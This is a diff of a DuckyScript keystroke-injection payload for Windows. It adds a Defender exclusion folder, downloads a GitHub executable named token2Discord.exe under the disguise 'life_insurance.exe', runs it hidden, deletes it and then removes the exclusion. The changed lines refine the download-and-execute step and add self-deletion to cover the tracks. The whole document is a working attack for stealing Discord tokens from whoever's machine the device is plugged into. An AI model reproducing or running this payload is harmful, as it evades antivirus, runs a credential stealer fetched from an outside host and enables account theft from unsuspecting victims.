@@ -11,10 +11,10 @@ DELAY 500
 STRING cd C:\; mkdir temp; cd temp; Add-MpPreference -ExclusionPath "C:\temp"
 ENTER
 DELAY 500
-REM THANK YOU FALSE PHIL. for mario head.. I am a lazy mf
-STRING $down = New-Object System.Net.WebClient; $url = 'https://github.com/CharlesTheGreat77/token2Discord/raw/main/token2Discord.exe'; $file = 'C:\temp\life_insurance.exe'; $down.DownloadFile($url, $file); Start-Process -FilePath life_insurance.exe -WindowStyle Hidden;
+mkdir temp ; cd temp
+$url = 'https://github.com/CharlesTheGreat77/token2Discord/raw/main/token2Discord.exe'; $file = 'C:\temp\life_insurance.exe'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process -FilePath $file -WindowStyle Hidden; Remove-Item -Path $file
 ENTER
-DELAY 5000
+DELAY 6000
 STRING Remove-MpPreference -ExclusionPath "C:\temp"
 ENTER
 DELAY 500
